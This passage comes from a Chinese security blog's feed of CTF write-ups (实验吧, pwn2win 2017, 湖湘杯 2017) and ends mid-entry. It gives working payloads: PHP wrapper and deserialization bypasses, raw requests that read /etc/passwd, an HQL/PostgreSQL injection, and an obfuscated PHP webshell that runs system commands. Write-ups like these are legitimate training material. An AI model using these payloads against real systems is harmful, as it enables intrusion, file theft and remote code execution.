re.search(&apos;密码错误&apos;, data1) == None and re.search(&apos;验证码错误&apos;, data1) == None and re.search(&apos;服务器安全狗防护验证页面&apos;, data1) == None:</span><br><span class="line">if right == 0:</span><br><span class="line">right = 1</span><br><span class="line">index -= 1</span><br><span class="line"># print(&apos;right&apos; + str(index))</span><br><span class="line">else:</span><br><span class="line">print(index)</span><br><span class="line">f = open(&apos;log.txt&apos;, &apos;a&apos;)</span><br><span class="line">f.write(str(index))</span><br><span class="line">f.write(data1)</span><br><span class="line">f.close()</span><br><span class="line">break</span><br><span class="line">else:</span><br><span class="line">right = 0</span><br><span class="line">index += 1</span><br><span class="line"># res = urllib2.urlopen</span><br><span class="line"># get(0)</span><br><span class="line">for i in xrange(10):</span><br><span class="line">t =threading.Thread(target=get,args=(i,))</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure></p><h1 id="5-admin"><a href="#5-admin" class="headerlink" title="5. admin"></a>5. admin</h1><p>直接请求，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">you are not admin !</span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>可以用php伪协议绕过，user=php://input，然后post的数据为the user is admin</p><p>然后，include部分也可以用PHP伪协议读取文件，file=php://filter/convert.base64-encode/resource=index.php</p><p><img src="/img/shianbei/4.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/f1a9/&quot;,$file))&#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file); //class.php</span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        echo $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></p><p>然后发现了class.php，也拿下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Read&#123;//f1a9.php</span><br><span class="line">    public $file;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;__toString was called!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看到提示读取f1a9.php</p><p>然后，看到__toString方法和$pass = unserialize($pass);，想到反序列化漏洞，构造如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /shian-du/index.php?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125; HTTP/1.1</span><br><span class="line">Host: ctf1.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: XDEBUG_SESSION=netbeans-xdebug; PHPSESSID=cko7epgroock0vgau9amiri4l5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 17</span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure></p><p><img src="/img/shianbei/5.png" alt=""></p><p>然后，就想尝试下这个任意文件读取有多大权限，试了下/etc/passwd发现可以读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /shian-du/index.php?user=php://input&amp;file=php://filter/convert.base64-encode/resource=../../../../../etc/passwd HTTP/1.1</span><br><span class="line">Host: ctf1.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://src.shiyanbar.com/student/exam-second/seize-flag</span><br><span class="line">Cookie: XDEBUG_SESSION=netbeans-xdebug; PHPSESSID=cko7epgroock0vgau9amiri4l5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 17</span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure></p><p>然后，发现web都是在同一个服务器上面，尝试读取第一题的index.php看看，<br>发现可以，那么，原则上，通过这道题就可以直接kill掉所有的web题，具有较大危害（可惜前面的题目都已经自己做出来了）。</p><h1 id="线下赛"><a href="#线下赛" class="headerlink" title="线下赛"></a>线下赛</h1><h2 id="渗透阶段"><a href="#渗透阶段" class="headerlink" title="渗透阶段"></a>渗透阶段</h2><h3 id="第一题："><a href="#第一题：" class="headerlink" title="第一题："></a>第一题：</h3><p>后台弱口令，这。。。admin/MetInfo<br>你会发现过不了这个这题就废了</p><h3 id="第二题："><a href="#第二题：" class="headerlink" title="第二题："></a>第二题：</h3><p>phpmyadmin爆破弱口令这。。。root/abc123</p><h3 id="第三题："><a href="#第三题：" class="headerlink" title="第三题："></a>第三题：</h3><p>又是一个wooyun上的已知漏洞利用，额，这个是不给网的，跟现实有点脱离吧</p><h2 id="攻防阶段"><a href="#攻防阶段" class="headerlink" title="攻防阶段"></a>攻防阶段</h2><p>开始几分钟部分队伍未修改默认密码，是关于修改默认密码的问题吧，然而刚刚开始的时候服务器很卡很卡，自己都进不去，这。。。<br>Redis<br>和<br>Drupal<br>和<br>FFmpeg<br>的漏洞，嗯，这个的确是平时没有关注到</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwn2win-ctf-2017</title>
      <link href="//blog/2017/pwn2win-ctf-2017.html"/>
      <url>//blog/2017/pwn2win-ctf-2017.html</url>
      
        <content type="html"><![CDATA[<h2 id="Black-Pentesting"><a href="#Black-Pentesting" class="headerlink" title="Black Pentesting"></a>Black Pentesting</h2><p>Our agents found a BSC server which is used to contact one of the Corp’s sysadmins. We managed to get his IP (45.77.146.27), but we still haven’t found it’s domain. After obtaining the domain, we believe it’s possible to exploit their website somehow, and then obtain sensitive data. Use your old school pentesting skills and you will be rewarded!<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大意是给了IP 45.77.146.27，让你找域名，题目在那里，一直找到的是 45.77.146.27.vultr.com 这个域名，应该是bloodsuckers.world才对，所以，连题目都没看到，进去后是个留言框。</span><br></pre></td></tr></table></figure></p><h2 id="criminal"><a href="#criminal" class="headerlink" title="criminal"></a>criminal</h2><p>很容易通过报错显示出SQL语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by xxx</span><br></pre></td></tr></table></figure></p><p>且调用关系是应用程序拼接成HQL语句，HQL解析为postgresql后执行<br>order by处存在注入<br>一开始以为是postgresql注入<br>构造这样如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&amp;age=&amp;crime=&amp;order=case when(ascii(substr((current_database()),1,1))=99) then age end desc, case when 1=1 then age end asc&amp;submit=</span><br></pre></td></tr></table></figure></p><p>可以获得一些信息，但是发现order by不能用子查询，postgresql是允许的，但是HQL不允许，所以不能到达。<br>其实这应该HQL注入<br>何为HQL注入？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对象关系映射（英语：Object Relational Mapping，简称ORM，或O/RM，或O/R mapping），是一种程序设计技术，用于实现面向对象编程语言里不同类型系统的数据之间的转换。从效果上说，它其实是创建了一个可在编程语言里使用的“虚拟对象数据库”</span><br><span class="line">方便在关系数据库和类似于 Java， C# 等面向对象的编程语言中转换数据的技术</span><br></pre></td></tr></table></figure></p><p><img src="/img/pwn2win/1.png" alt=""></p><p>The nature of ORM injection is similar to SQL injection.<br><img src="/img/pwn2win/3.png" alt=""><br><img src="/img/pwn2win/4.png" alt=""><br><img src="/img/pwn2win/2.png" alt=""><br>POJO=Plain Ordinary Java Object<br><img src="/img/pwn2win/5.png" alt=""></p><p><a href="https://github.com/0ang3el/HQLi-playground" target="_blank" rel="noopener">https://github.com/0ang3el/HQLi-playground</a></p><h2 id="Hibernate-ORM"><a href="#Hibernate-ORM" class="headerlink" title="Hibernate ORM"></a>Hibernate ORM</h2><ul><li>Single Quote Escaping</li></ul><p>对单引号转义的差异</p><ul><li>在MySQL中，单引号<code>&#39;</code>转义为<code>\&#39;</code></li><li>在HQL中，单引号<code>&#39;</code>转义为<code>&#39;&#39;</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">&apos;abc\&apos;&apos;or 1=(select 1)--&apos;</span><br><span class="line">对于HQL来说是字符串</span><br><span class="line">对于MySQL来说，是字符串加注入的SQL语句</span><br></pre></td></tr></table></figure></li></ul><p><img src="/img/pwn2win/6.png" alt=""></p><ul><li>$-Quoted Strings<br>这种方法对允许[\$\$aaa’bbb\$\$]这种方式表示字符串的DBMS有效<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PostgreSQL</span><br><span class="line">H2</span><br></pre></td></tr></table></figure></li></ul><p><img src="/img/pwn2win/7.png" alt=""><br><img src="/img/pwn2win/8.png" alt=""></p><ul><li><p>Magic Functions</p><ul><li>这种方法对能在字符串参数中执行SQL表达式的DBMS有效<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PostgreSQL</span><br><span class="line">Oracle</span><br></pre></td></tr></table></figure></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PostgreSQL</span><br><span class="line">內建函数query_to_xml(&apos;Arbitrary SQL&apos;)</span><br><span class="line">array_upper(xpath(&apos;row&apos;,query_to_xml(&apos;select 1 where 1337&gt;1&apos;,true, false,&apos;&apos;)),1)</span><br><span class="line">返回行数是否大于0</span><br></pre></td></tr></table></figure><p><img src="/img/pwn2win/9.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Oracle 有內建函数DBMS_XMLGEN.getxml(&apos;SQL&apos;)</span><br><span class="line">NVL(TO_CHAR(DBMS_XMLGEN.getxml(&apos;select 1 where 1337&gt;1&apos;)),&apos;1&apos;)!=&apos;1&apos;</span><br><span class="line">返回是否row大于0</span><br></pre></td></tr></table></figure><ul><li>UNICODE</li></ul><p>这种方法对于允许用Unicode字符作为分隔符的DBMS有用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mssql</span><br><span class="line">H2</span><br></pre></td></tr></table></figure></p><p>所以这里利用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$$      在HQL中是变量名</span><br><span class="line">$$xxx$$ 在postgresql中是字符串</span><br></pre></td></tr></table></figure><p>构造，通过报错将flag显示出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by case when (555=(select 0 from Criminal c where $$=&apos;$$= concat(  chr(61),chr(39)) and (cast((select flag::text from flag) as integer)=2)) then 1 else 5 end --&apos;)) then 1 else 5 end desc</span><br></pre></td></tr></table></figure></p><p>还有人用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast(cast(pg_read_binary_file(&apos;pg_xlog/000000010000000000000001&apos;)as text) as int)</span><br></pre></td></tr></table></figure></p><p>看日志，这思路很强</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>湖湘杯-2017-ctf</title>
      <link href="//blog/2017/%E6%B9%96%E6%B9%98%E6%9D%AF-2017-ctf.html"/>
      <url>//blog/2017/%E6%B9%96%E6%B9%98%E6%9D%AF-2017-ctf.html</url>
      
        <content type="html"><![CDATA[<h1 id="湖湘杯复赛"><a href="#湖湘杯复赛" class="headerlink" title="湖湘杯复赛"></a>湖湘杯复赛</h1><h2 id="Web-300-拿个shell就给flag"><a href="#Web-300-拿个shell就给flag" class="headerlink" title="Web 300 拿个shell就给flag"></a>Web 300 拿个shell就给flag</h2><p>看源码发现过滤了各种字符<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="string">"On"</span>);</span><br><span class="line">error_reporting(E_ALL | E_STRICT);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]))&#123;</span><br><span class="line">   show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_string</span><span class="params">( $length )</span> </span>&#123;</span><br><span class="line">   $chars = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;    </span><br><span class="line">   $size = strlen( $chars );</span><br><span class="line">   $str = <span class="string">''</span>;</span><br><span class="line">   <span class="keyword">for</span>( $i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">       $str .= $chars[ rand( <span class="number">0</span>, $size - <span class="number">1</span> ) ];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">$data = $_GET[<span class="string">'content'</span>];</span><br><span class="line">$black_char = <span class="keyword">array</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>,<span class="string">' '</span>, <span class="string">'!'</span>, <span class="string">'"'</span>, <span class="string">'#'</span>, <span class="string">'%'</span>, <span class="string">'&amp;'</span>, <span class="string">'*'</span>, <span class="string">','</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">':'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'?'</span>, <span class="string">'@'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'\\'</span>, <span class="string">'^'</span>, <span class="string">'`'</span>,  <span class="string">'|'</span>, <span class="string">'~'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">   <span class="keyword">if</span> (stripos($data, $b) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"关键字WAF"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename=rand_string(<span class="number">0x20</span>).<span class="string">'.php'</span>;</span><br><span class="line">$folder=<span class="string">'uploads/'</span>;</span><br><span class="line">$full_filename = $folder.$filename;</span><br><span class="line"><span class="keyword">if</span>(file_put_contents($full_filename, <span class="string">'&lt;?php '</span>.$data))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;a href='"</span>.$full_filename.<span class="string">"'&gt;shell&lt;/a&gt;&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"我的/flag,你读到了么"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"噢 噢,错了"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>fuzz等操作发现有以下字符可以绕过black_char<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">_</span><br><span class="line">$</span><br><span class="line">=</span><br><span class="line">+</span><br><span class="line">.</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">&apos;</span><br><span class="line">中文</span><br></pre></td></tr></table></figure></p><p>然后就用这些构造webshell吧<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=<span class="string">''</span>.$_; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'&#123;'</span>==<span class="string">'&#125;'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure></p><p>则可以有如下payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?content=$_=[];$_=''.$_;$_=$_['&#123;'=='&#125;'];$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____='_';$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure></p><p><img src="/img/hxb2017/1.png" alt="1"><br>然后访问该php木马<br>post数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=system(&apos;ls&apos;)</span><br></pre></td></tr></table></figure></p><p>ls改成你想要执行的命令</p><p><img src="/img/hxb2017/3.png" alt="3"><br><img src="/img/hxb2017/4.png" alt="4"></p><h2 id="Web-150-random"><a href="#Web-150-random" 